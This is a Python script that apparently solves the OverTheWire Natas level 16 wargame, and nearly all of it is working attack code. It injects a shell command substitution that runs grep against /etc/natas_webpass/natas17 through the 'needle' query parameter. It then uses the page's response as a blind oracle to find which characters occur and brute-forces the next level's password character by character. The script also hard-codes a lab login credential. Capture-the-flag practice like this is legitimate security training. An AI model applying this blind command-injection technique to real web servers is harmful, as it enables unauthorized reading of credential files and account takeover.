#!/bin/python
import requests,string
from requests.auth import HTTPBasicAuth  

url = "http://natas16.natas.labs.overthewire.org"
auth=HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')  

# characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
characters = ''.join([string.ascii_letters,string.digits])

password_dictionary = ['',]
exists_str = "doomed"
for char in characters:

    uri = ''.join([url,'?',f'needle={exists_str}$(grep {char} /etc/natas_webpass/natas17)'])
    r = requests.get(uri, auth=auth)

    if exists_str not in r.text:
        password_dictionary.append(char)
        print(f"Password Dictionary: {''.join(password_dictionary)}")

print("Dictionary build complete.")
print(f"Dictionary: {''.join(password_dictionary)}")

# Given the dictionary of characters we just built, we'll try each character in that list
print("Now attempting to brute force...")
password_list = ["",]
password = ''
for i in range(1,32):
    for char in password_dictionary:
        test = ''.join([password,char])
        # Build the GET Request
        uri = ''.join([url,'?',f'needle={exists_str}$(grep ^{test} /etc/natas_webpass/natas17)'])
        # Send the HTTP GET request to the server
        r = requests.get(uri, auth=auth)
        # Parse the HTTP response
        if exists_str not in r.text:
            password_list.append(char)
            password = ''.join(password_list)
            print(f"Length: {len(password)}, Password: {password}")